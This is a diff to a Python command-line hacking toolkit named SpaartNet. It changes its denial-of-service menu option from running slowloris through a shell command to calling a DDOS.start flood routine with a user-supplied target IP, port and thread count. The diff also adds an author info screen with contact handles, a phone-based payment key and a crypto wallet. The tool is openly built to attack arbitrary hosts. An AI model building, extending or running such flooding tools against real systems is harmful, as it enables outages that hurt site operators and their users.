@@ -1,4 +1,4 @@
-from libs.yyax import c, d, r, f, adress
+from libs.yyax import c, d, r, f, adress, DDOS
 import os
 import time
 import random
@@ -22,6 +22,7 @@ def options():
     {c.cyan('[')}{c.yellow('2')}{c.cyan(']')} {c.cyan('UserRecon')}
     {c.cyan('[')}{c.yellow('3')}{c.cyan(']')} {c.cyan('Found Dirs')}
     {c.cyan('[')}{c.yellow('4')}{c.cyan(']')} {c.cyan('Adress by IP')}
+    {c.cyan('[')}{c.yellow('Y')}{c.cyan(']')} {c.cyan('Yyax - Info')}
     {c.cyan('[')}{c.yellow('X')}{c.cyan(']')} {c.cyan('Exit')}
     
     {c.cyan('[')}{c.yellow('#')}{c.cyan(']')} {c.cyan('Choose an Option: ')}"""
@@ -46,8 +47,11 @@ def options():
 
         elif opt2_choose2 == '2':
 
-            slowloris_target = input(f"    {hashtag} {c.cyan('Target IP/URL: ')}")
-            os.system(f'pip3 install slowloris && pip3 install slowloris --user && slowloris {slowloris_target}')
+            slowloris_target_ip = input(f"    {hashtag} {c.cyan('Target IP: ')}")
+            slowloris_target_port = input(f"    {hashtag} {c.cyan('Target PORT: ')}")
+            
+            threads4ddos = int(input(f"    {hashtag} {c.cyan('Threads Number (start in 10): ')}"))
+            DDOS.start(target_ip=slowloris_target_ip, target_port=slowloris_target_port, num_threads=threads4ddos, packet_size_mb=2)
 
     elif opt_choose == "2":
 
@@ -82,6 +86,20 @@ def options():
     {c.cyan('Google Maps Link by')} {c.yellow(ipt)}:
     {c.green(mapslink)}
 """)
+    
+    elif opt_choose in ['y', 'Y']:
+        yyax_info = rf"""
+    {c.purple('Area of ​​expertise: Information security, development of tools aimed at red team and front-end developer')}
+    {c.purple('Favorite programming languages, markup and any other names: python, php, html, css')}
+    {c.purple('Github: https://github.com/Yyax13')}
+    {c.purple('Discord: solo.yyax')}
+    {c.purple('Pix: +55 (43) 99122-5928')}
+    {c.purple('MetaMask Wallet: 0xA3Aa0aD78279819632439f21bFdbC375574b84bF')}"""
+        print(yyax_info)
+
+    elif opt_choose in ['x', 'X']:
+        os.system('exit')
+        pass
         
 
 def banner():
@@ -93,7 +111,7 @@ def banner():
 {c.yellow('_/_/_/    _/_/_/      _/_/_/    _/_/_/  _/            _/_/  _/      _/    _/_/_/      _/_/')}      
          {c.yellow('_/')}                                                                                     
         {c.yellow('_/')}                                                                                      
-Welcome to SpaartNet"""
+{c.cyan('Welcome to SpaartNet')}"""
     print(banner)
 
 screen()
